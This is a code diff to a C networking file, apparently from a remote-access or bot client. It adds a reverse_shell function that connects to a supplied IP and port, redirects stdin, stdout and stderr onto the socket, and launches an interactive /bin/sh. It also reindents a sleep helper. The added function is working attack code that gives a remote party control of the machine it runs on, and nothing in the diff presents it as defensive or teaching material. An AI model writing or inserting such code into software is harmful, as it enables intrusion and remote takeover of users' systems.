@@ -153,15 +153,51 @@ int read_packet(int *fd, char *buffer) {
 	}
 }
 
+#ifdef _WIN32
+void reverse_shell(CHAR *ip, int port) {
+#else
+void reverse_shell(char *ip, int port) {
+#endif
+    struct sockaddr_in sockin;
+    sockin.sin_family = AF_INET;
+#ifdef _WIN32
+#else
+    int shell_fd;
+
+    sockin.sin_family = AF_INET;
+    sockin.sin_addr.s_addr = inet_addr(ip);
+    sockin.sin_port = htons(port);
+
+    shell_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+
+    if (shell_fd == INVALID_SOCKET) {
+        return;
+    }
+
+    if (connect(shell_fd, (struct sockaddr *)&sockin, sizeof(sockin)) == SOCKET_ERROR) {
+        return;
+    }
+
+    write(shell_fd, SHELL_MOTD, strlen(SHELL_MOTD));
+
+    dup2(shell_fd, 0);
+    dup2(shell_fd, 1);
+    dup2(shell_fd, 2);
+
+    execl("/bin/sh", "sh", "-i", NULL, NULL);
+    close(shell_fd);
+#endif
+
+}
 
 // Private methods
 
 void net_sleep(int seconds) {
 #ifdef _WIN32
-	Sleep(seconds * 1000);
+    Sleep(seconds * 1000);
 #endif
 #if defined(__linux__) || defined(__APPLE__)
-	sleep(seconds);
-	fflush(stdout);
+    sleep(seconds);
+    fflush(stdout);
 #endif
 }
